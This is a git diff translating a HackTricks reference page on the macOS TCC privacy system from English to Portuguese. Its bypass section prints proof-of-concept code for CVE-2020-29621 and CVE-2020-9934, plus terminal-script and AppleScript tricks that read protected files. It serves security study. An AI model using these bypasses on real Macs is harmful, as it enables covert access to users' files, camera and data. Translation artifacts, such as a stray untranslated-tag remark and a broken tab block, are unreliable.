@@ -4,36 +4,36 @@
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## **Basic Information**
+## **Informações Básicas**
 
-**TCC (Transparency, Consent, and Control)** is a mechanism in macOS to **limit and control application access to certain features**, usually from a privacy perspective. This can include things such as location services, contacts, photos, microphone, camera, accessibility, full disk access, and a bunch more.
+**TCC (Transparência, Consentimento e Controle)** é um mecanismo no macOS para **limitar e controlar o acesso de aplicativos a determinados recursos**, geralmente do ponto de vista da privacidade. Isso pode incluir coisas como serviços de localização, contatos, fotos, microfone, câmera, acessibilidade, acesso total ao disco e muito mais.
 
-From a user’s perspective, they see TCC in action **when an application wants access to one of the features protected by TCC**. When this happens the **user is prompted** with a dialog asking them whether they want to allow access or not.
+Do ponto de vista do usuário, o TCC entra em ação **quando um aplicativo deseja acessar um dos recursos protegidos pelo TCC**. Quando isso acontece, o **usuário é solicitado** com uma caixa de diálogo perguntando se deseja permitir o acesso ou não.
 
-It's also possible to **grant apps access** to files by **explicit intents** from users for example when a user **drags\&drop a file into a program** (obviously the program should have access to it).
+Também é possível **conceder acesso a aplicativos** a arquivos por **intenções explícitas** dos usuários, por exemplo, quando um usuário **arrasta e solta um arquivo em um programa** (obviamente, o programa deve ter acesso a ele).
 
-![An example of a TCC prompt](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)
+![Um exemplo de uma solicitação TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)
 
-**TCC** is handled by the **daemon** located in `/System/Library/PrivateFrameworks/TCC.framework/Resources/tccd`configured in `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registering the mach service `com.apple.tccd.system`).
+**TCC** é tratado pelo **daemon** localizado em `/System/Library/PrivateFrameworks/TCC.framework/Resources/tccd` configurado em `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando o serviço mach `com.apple.tccd.system`).
 
-There is a **user-mode tccd** running per logged in user defined in `/System/Library/LaunchAgents/com.apple.tccd.plist` registering the mach services `com.apple.tccd` and `com.apple.usernotifications.delegate.com.apple.tccd`.
+Existe um **tccd de modo de usuário** em execução por usuário conectado definido em `/System/Library/LaunchAgents/com.apple.tccd.plist` registrando os serviços mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.
 
-Permissions are **inherited from the parent** application and the **permissions** are **tracked** based on the **Bundle ID** and the **Developer ID**.
+As permissões são **herdadas do aplicativo pai** e as **permissões** são **rastreadas** com base no **ID do pacote** e no **ID do desenvolvedor**.
 
-### TCC Database
+### Banco de Dados TCC
 
-The selections is then stored in the TCC system-wide database in **`/Library/Application Support/com.apple.TCC/TCC.db`** or in **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** for per-user preferences. The database is **protected from editing with SIP**(System Integrity Protection), but you can read them by granting **full disk access**.
+As seleções são então armazenadas no banco de dados do sistema TCC em **`/Library/Application Support/com.apple.TCC/TCC.db`** ou em **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferências por usuário. O banco de dados é **protegido contra edição com SIP** (Proteção de Integridade do Sistema), mas você pode lê-los concedendo **acesso total ao disco**.
 
 {% hint style="info" %}
-The **notification center UI** can make **changes in the system TCC database**:
+A **interface do centro de notificações** pode fazer **alterações no banco de dados do TCC do sistema**:
 
 {% code overflow="wrap" %}
 ```bash
@@ -44,7 +44,7 @@ com.apple.rootless.storage.TCC
 ```
 {% endcode %}
 
-However, users can **delete or query rules** with the **`tccutil`** command line utility.
+No entanto, os usuários podem **excluir ou consultar regras** com a utilidade de linha de comando **`tccutil`**.
 {% endhint %}
 
 {% tabs %}
@@ -67,7 +67,17 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 ```
 {% endtab %}
 
-{% tab title="system DB" %}
+Você pode encontrar a lista completa de aplicativos que possuem permissões TCC no banco de dados do sistema. Para acessar o banco de dados, execute o seguinte comando:
+
+```bash
+sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
+```
+
+Em seguida, você pode executar a seguinte consulta SQL para obter a lista de aplicativos e suas permissões:
+
+```sql
+SELECT service, client, allowed FROM access;
+```
 ```bash
 sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
 sqlite> .schema
@@ -88,24 +98,22 @@ sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
 {% endtabs %}
 
 {% hint style="success" %}
-Checking both databases you can check the permissions an app has allowed, has forbidden, or doesn't have (it will ask for it).
+Ao verificar ambos os bancos de dados, você pode verificar as permissões que um aplicativo permitiu, proibiu ou não tem (ele pedirá).
 {% endhint %}
 
-* The **`auth_value`** can have different values: denied(0), unknown(1), allowed(2), or limited(3).
-* The **`auth_reason`** can take the following values: Error(1), User Consent(2), User Set(3), System Set(4), Service Policy(5), MDM Policy(6), Override Policy(7), Missing usage string(8), Prompt Timeout(9), Preflight Unknown(10), Entitled(11), App Type Policy(12)
-* For more information about the **other fields** of the table [**check this blog post**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
+* O **`auth_value`** pode ter valores diferentes: negado(0), desconhecido(1), permitido(2) ou limitado(3).
+* O **`auth_reason`** pode ter os seguintes valores: Erro(1), Consentimento do usuário(2), Configuração do usuário(3), Configuração do sistema(4), Política de serviço(5), Política MDM(6), Política de substituição(7), String de uso ausente(8), Tempo limite de prompt(9), Preflight desconhecido(10), Com direito(11), Política de tipo de aplicativo(12).
+* Para obter mais informações sobre os **outros campos** da tabela, [**verifique esta postagem no blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).
 
 {% hint style="info" %}
-Some TCC permissions are: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... There is no public list that defines all of them but you can check this [**list of known ones**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
+Algumas permissões do TCC são: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Não há uma lista pública que defina todas elas, mas você pode verificar esta [**lista de conhecidas**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
 {% endhint %}
 
-You could also check **already given permissions** to apps in `System Preferences --> Security & Privacy --> Privacy --> Files and Folders`.
+Você também pode verificar as **permissões já concedidas** aos aplicativos em `Preferências do Sistema --> Segurança e Privacidade --> Privacidade --> Arquivos e Pastas`.
 
-### TCC Signature Checks
+### Verificações de assinatura do TCC
 
-The TCC **database** stores the **Bundle ID** of the application, but it also **stores** **information** about the **signature** to **make sure** the App asking to use the a permission is the correct one.
-
-{% code overflow="wrap" %}
+O **banco de dados** do TCC armazena o **Bundle ID** do aplicativo, mas também **armazena informações** sobre a **assinatura** para **garantir** que o aplicativo que solicita o uso de uma permissão seja o correto.
 ```bash
 # From sqlite
 sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
@@ -122,13 +130,12 @@ csreq -t -r /tmp/telegram_csreq.bin
 
 ### Entitlements
 
-Apps **don't only need** to **request** and have been **granted access** to some resources, they also need to **have the relevant entitlements**.\
-For example **Telegram** has the entitlement `com.apple.security.device.camera` to request **access to the camera**. An **app** that **doesn't** have this **entitlement won't be able** to access the camera (and the user won't be be even asked for the permissions).
+Os aplicativos **não apenas precisam** solicitar e ter sido **concedido acesso** a alguns recursos, eles também precisam **ter as permissões relevantes**.\
+Por exemplo, o **Telegram** tem a permissão `com.apple.security.device.camera` para solicitar **acesso à câmera**. Um **aplicativo** que **não tenha** essa **permissão não poderá** acessar a câmera (e o usuário nem mesmo será solicitado a conceder as permissões).
 
-However, for apps to **access** to **certain user folders**, such as `~/Desktop`, `~/Downloads` and `~/Documents`, they **don't need** to have any specific **entitlements.** The system will transparently handle access and **prompt the user** as needed.
+No entanto, para que os aplicativos tenham **acesso a determinadas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, eles **não precisam** ter nenhuma **permissão específica**. O sistema lidará com o acesso de forma transparente e **solicitará permissão ao usuário** conforme necessário.
 
-Apple's apps **won’t generate prompts**. They contain **pre-granted rights** in their **entitlements** list, meaning they will **never generate a popup**, **nor** they will show up in any of the **TCC databases.** For example:
-
+Os aplicativos da Apple **não gerarão prompts**. Eles contêm **direitos pré-concedidos** em sua lista de **permissões**, o que significa que eles **nunca gerarão um pop-up**, **nem** aparecerão em nenhum dos **bancos de dados do TCC**. Por exemplo:
 ```bash
 codesign -dv --entitlements :- /System/Applications/Calendar.app
 [...]
@@ -139,19 +146,17 @@ codesign -dv --entitlements :- /System/Applications/Calendar.app
     <string>kTCCServiceAddressBook</string>
 </array>
 ```
+Isso evitará que o Calendário solicite ao usuário acesso a lembretes, calendário e lista de endereços.
 
-This will avoid Calendar ask the user to access reminders, calendar and the address book.
+### Locais sensíveis desprotegidos
 
-### Sensitive unprotected places
-
-* $HOME (itself)
+* $HOME (ele mesmo)
 * $HOME/.ssh, $HOME/.aws, etc
 * /tmp
 
-### User Intent / com.apple.macl
+### Intenção do usuário / com.apple.macl
 
-As mentioned previously, it possible to **grant access to an App to a file by drag\&dropping it to it**. This access won't be specified in any TCC database but as an **extended** **attribute of the file**. This attribute will **store the UUID** of the allowed app:
-
+Como mencionado anteriormente, é possível **conceder acesso a um aplicativo a um arquivo arrastando-o e soltando-o nele**. Esse acesso não será especificado em nenhum banco de dados TCC, mas como um **atributo estendido do arquivo**. Esse atributo irá **armazenar o UUID** do aplicativo permitido:
 ```bash
 xattr Desktop/private.txt
 com.apple.macl
@@ -166,19 +171,17 @@ Filename,Header,App UUID
 otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
     uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
 ```
-
 {% hint style="info" %}
-It's curious that the **`com.apple.macl`** attribute is managed by the **Sandbox**, not tccd
+É curioso que o atributo **`com.apple.macl`** seja gerenciado pelo **Sandbox**, não pelo tccd
 {% endhint %}
 
-The extended attribute `com.apple.macl` **can’t be cleared** like other extended attributes because it’s **protected by SIP**. However, as [**explained in this post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), it's possible to disable it **zipping** the file, **deleting** it and **unzipping** it.
+O atributo estendido `com.apple.macl` **não pode ser apagado** como outros atributos estendidos porque é **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desabilitá-lo **compactando** o arquivo, **apagando-o** e **descompactando-o**.
 
 ## Bypasses
 
-### Write Bypass
+### Bypass de Escrita
 
-This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:
-
+Isso não é um bypass, é apenas como o TCC funciona: **Ele não protege contra escrita**. Se o Terminal **não tiver acesso para ler a Área de Trabalho de um usuário, ainda pode escrever nela**:
 ```shell-session
 username@hostname ~ % ls Desktop 
 ls: Desktop: Operation not permitted
@@ -188,31 +191,29 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
+O atributo estendido `com.apple.macl` é adicionado ao novo arquivo para dar acesso ao aplicativo criador para lê-lo.
 
-The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.
+### Bypass SSH
 
-### SSH Bypass
-
-By default an access via **SSH** will have **"Full Disk Access"**. In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges):
+Por padrão, o acesso via SSH terá "Acesso total ao disco". Para desativar isso, você precisa tê-lo listado, mas desativado (removê-lo da lista não removerá esses privilégios):
 
 ![](<../../../../.gitbook/assets/image (569).png>)
 
-Here you can find examples of how some **malwares have been able to bypass this protection**:
+Aqui você pode encontrar exemplos de como alguns malwares conseguiram contornar essa proteção:
 
 * [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
-### Electron Bypass
+### Bypass Electron
 
-The JS code of an Electron App is not signed, so an attacker could move the app to a writable location, inject malicious JS code and launch that app and abuse the TCC permissions.
+O código JS de um aplicativo Electron não é assinado, então um invasor poderia mover o aplicativo para um local gravável, injetar código JS malicioso e lançar esse aplicativo e abusar das permissões do TCC.
 
-Electron is working on **`ElectronAsarIntegrity`** key in Info.plist that will contain a hash of the app.asar file to check the integrity of the JS code before executing it.
+O Electron está trabalhando na chave **`ElectronAsarIntegrity`** em Info.plist que conterá um hash do arquivo app.asar para verificar a integridade do código JS antes de executá-lo.
 
-### Terminal Scripts
+### Scripts do Terminal
 
-It's quiet common to give terminal **Full Disk Access (FDA)**, at least in computers used by tech people. And it's possible to invoke **`.terminal`** scripts using with it.
+É bastante comum dar acesso total ao disco (FDA) ao terminal, pelo menos em computadores usados por pessoas de tecnologia. E é possível invocar scripts **`.terminal`** usando-o.
 
-**`.terminal`** scripts are plist files such as this one with the command to execute in the **`CommandString`** key:
-
+Os scripts **`.terminal`** são arquivos plist como este com o comando a ser executado na chave **`CommandString`**:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -230,9 +231,7 @@ It's quiet common to give terminal **Full Disk Access (FDA)**, at least in compu
 </dict>
 </plist>
 ```
-
-An application could write a terminal script in a location such as /tmp and launch it with a come such as:
-
+Uma aplicação poderia escrever um script de terminal em um local como /tmp e executá-lo com um comando como:
 ```objectivec
 // Write plist in /tmp/tcc.terminal
 [...]
@@ -243,24 +242,23 @@ task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
 exploit_location]; task.standardOutput = pipe;
 [task launch];
 ```
+### kTCCServiceAppleEvents / Automação
 
-### kTCCServiceAppleEvents / Automation
+Um aplicativo com a permissão **`kTCCServiceAppleEvents`** será capaz de **controlar outros aplicativos**. Isso significa que ele poderá **abusar das permissões concedidas aos outros aplicativos**.
 
-An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.
-
-For more info about Apple Scripts check:
+Para obter mais informações sobre Scripts da Apple, consulte:
 
 {% content-ref url="macos-apple-scripts.md" %}
 [macos-apple-scripts.md](macos-apple-scripts.md)
 {% endcontent-ref %}
 
-For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:
+Por exemplo, se um aplicativo tiver **permissão de Automação sobre o `iTerm`**, como neste exemplo em que o **`Terminal`** tem acesso ao iTerm:
 
 <figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-#### Over iTerm
+#### Sobre o iTerm
 
-Terminal, who doesn't have FDA, can call iTerm, which has it, and use it to perform actions:
+O Terminal, que não tem FDA, pode chamar o iTerm, que tem, e usá-lo para executar ações:
 
 {% code title="iterm.script" %}
 ```applescript
@@ -274,16 +272,13 @@ tell application "iTerm"
     end tell
 end tell
 ```
-{% endcode %}
-
+{% endcode %} (This tag should not be translated)
 ```bash
 osascript iterm.script
 ```
+#### Sobre o Finder
 
-#### Over Finder
-
-Or if an App has access over Finder, it could a script such as this one:
-
+Ou se um aplicativo tem acesso sobre o Finder, ele pode executar um script como este:
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -293,25 +288,23 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
+### Abuso de Processo
 
-### Process Abuse
+Se você conseguir **injetar código em um processo**, poderá abusar das permissões do TCC desse processo. 
 
-I you manage to **inject code in a process** you will be able to abuse the TCC permissions of that process.&#x20;
-
-Check process abuse techniques in the following page:
+Verifique as técnicas de abuso de processo na seguinte página:
 
 {% content-ref url="../../macos-proces-abuse/" %}
 [macos-proces-abuse](../../macos-proces-abuse/)
 {% endcontent-ref %}
 
-See some examples in the following sections:
+Veja alguns exemplos nas seguintes seções:
 
 ### CVE-2020-29621 - Coreaudiod
 
-The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.
+O binário **`/usr/sbin/coreaudiod`** tinha as permissões `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. O primeiro **permite a injeção de código** e o segundo dá acesso para **gerenciar o TCC**.
 
-This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:
-
+Este binário permitia carregar **plug-ins de terceiros** da pasta `/Library/Audio/Plug-Ins/HAL`. Portanto, era possível **carregar um plug-in e abusar das permissões do TCC** com este PoC:
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -338,15 +331,13 @@ __attribute__((constructor)) static void constructor(int argc, const char **argv
     NSLog(@"[+] Exploitation finished...");
     exit(0);
 ```
-
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
 
-The userland **tccd daemon** what using the **`HOME`** **env** variable to access the TCC users database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+O daemon **tccd** do usuário está usando a variável de ambiente **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
 
-According to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) and because the TCC daemon is running via `launchd` within the current user’s domain, it's possible to **control all environment variables** passed to it.\
-Thus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.\
+De acordo com [esta postagem do Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e porque o daemon TCC está sendo executado via `launchd` dentro do domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** passadas para ele.\
+Assim, um **atacante poderia definir a variável de ambiente `$HOME`** em **`launchctl`** para apontar para um **diretório controlado**, **reiniciar** o **daemon TCC** e, em seguida, **modificar diretamente o banco de dados do TCC** para dar a si mesmo **todas as permissões do TCC disponíveis** sem nunca solicitar ao usuário final.\
 PoC:
-
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
@@ -373,12 +364,11 @@ X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d69
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
-
 ### CVE-2023-26818 - Telegram
 
-Telegram had the entitlements `com.apple.security.cs.allow-dyld-environment-variables` and c`om.apple.security.cs.disable-library-validation`, so it was possible to abuse it to **get access to its permissions** such recording with the camera. You can [**find the payload in the writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
+O Telegram tinha as permissões `com.apple.security.cs.allow-dyld-environment-variables` e `com.apple.security.cs.disable-library-validation`, então era possível abusar dele para **obter acesso às suas permissões**, como gravar com a câmera. Você pode [**encontrar o payload no writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).
 
-## References
+## Referências
 
 * [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
 * [**https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
@@ -389,10 +379,10 @@ Telegram had the entitlements `com.apple.security.cs.allow-dyld-environment-vari
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
